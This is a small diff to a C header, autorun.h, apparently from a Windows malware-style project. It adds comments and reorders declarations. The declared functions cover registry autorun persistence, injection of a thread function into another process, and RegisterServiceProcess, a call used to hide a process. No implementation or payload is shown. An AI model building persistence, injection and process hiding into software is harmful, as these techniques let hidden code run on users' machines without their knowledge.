@@ -6,12 +6,12 @@
 #ifndef AUTORUN_H
 #define AUTORUN_H
 
-#include <windows.h>
-
+// Writing a program to the windows registry for autorun
 void RegisterProgram();
+// Loading libraries the "kernel32.dll" and "user32.dll"
 DWORD WINAPI func(LPVOID);
-BOOL Inject(HANDLE hProc, DWORD(WINAPI* func)(LPVOID));
 
+BOOL Inject(HANDLE hProc, DWORD(WINAPI* func)(LPVOID));
 BOOL(WINAPI* RegisterServiceProcess)(DWORD dwProcessId, DWORD dwType);
 
-#endif
+#endif // AUTORUN_H
